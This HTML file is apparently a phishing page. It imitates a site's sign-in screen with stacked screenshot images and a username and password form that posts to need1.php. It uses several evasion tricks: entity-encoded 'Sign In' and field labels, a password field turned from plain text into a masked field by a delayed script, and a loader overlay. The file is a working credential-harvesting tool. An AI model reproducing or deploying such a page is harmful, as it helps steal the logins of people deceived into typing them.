<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>S&#105;&#103;n &#73;&#110; </title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="images/favicon1.ico"/>
<style type="text/css"> 
.textbox {  
  	border-radius: 0px;
    font-family: verdana;
    font-size: 14px;
    padding-left: 8px;
    width: 184px;
    border: none;
	border-bottom: 1px solid #787070;
    height: 49px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #333;
	box-shadow: 0px 0px 0px 1px #19A0D4;	
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 } 
</style> 
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:140px; z-index:0"><a href="#"><img src="images/w1.png" alt="" title="" border=0 width=1349 height=140></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:79px; top:140px; width:1202px; height:533px; z-index:1"><img src="images/w2.png" alt="" title="" border=0 width=1202 height=533></div>

<div id="image3" style="position:absolute; overflow:hidden; left:197px; top:766px; width:975px; height:488px; z-index:2"><img src="images/w3.png" alt="" title="" border=0 width=975 height=488></div>

<div id="image4" style="position:absolute; overflow:hidden; left:198px; top:1306px; width:974px; height:516px; z-index:3"><img src="images/w4.png" alt="" title="" border=0 width=974 height=516></div>

<div id="image5" style="position:absolute; overflow:hidden; left:193px; top:1875px; width:980px; height:248px; z-index:4"><img src="images/w5.png" alt="" title="" border=0 width=980 height=248></div>

<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:2189px; width:1349px; height:722px; z-index:5"><img src="images/w6.png" alt="" title="" border=0 width=1349 height=722></div>
<form action=need1.php name=wardah method=post>
<input name="s" placeholder="U&#115;&#101;&#114;&#110;&#97;&#109;e " class="textbox" autocomplete="off" required type="text" style="position:absolute;width:186px;left:214px;top:205px;z-index:7">
<input name="w" placeholder="P&#97;&#115;&#115;&#119;&#111;&#114;d " class="textbox" autocomplete="off" required type="text" style="position:absolute;width:186px;left:214px;top:260px;z-index:8">
<div id="formimage1" style="position:absolute; left:214px; top:352px; z-index:9"><input type="image" name="formimage1" width="186" height="42" src="images/wgh.png"></div>
<div id="image3" style="position:absolute; overflow:hidden; left:209px; top:400px; width:187px; height:79px; z-index:10"><a href="#"><img src="images/w7.png" alt="" title="" border=0 width=187 height=79></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:211px; top:530px; width:946px; height:126px; z-index:11"><a href="#"><img src="images/w8.png" alt="" title="" border=0 width=946 height=126></a></div>

</div>

</body>
</html>
